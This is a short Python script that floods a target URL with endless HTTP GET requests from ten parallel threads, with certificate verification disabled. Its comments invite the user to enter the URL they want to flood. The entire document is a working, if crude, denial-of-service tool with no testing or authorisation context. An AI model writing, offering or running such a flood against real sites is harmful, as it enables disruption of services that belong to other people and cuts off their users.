import requests
import threading

def flood(url):
    while True:
        try:
            response = requests.get(url, verify=False)
            print(f"Sent request to {url}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

# Enter the URL you want to flood
target_url = "https://example.com"

# Enter the number of threads you want to use for flooding
num_threads = 10

# Start the flood
for _ in range(num_threads):
    threading.Thread(target=flood, args=(target_url,)).start()
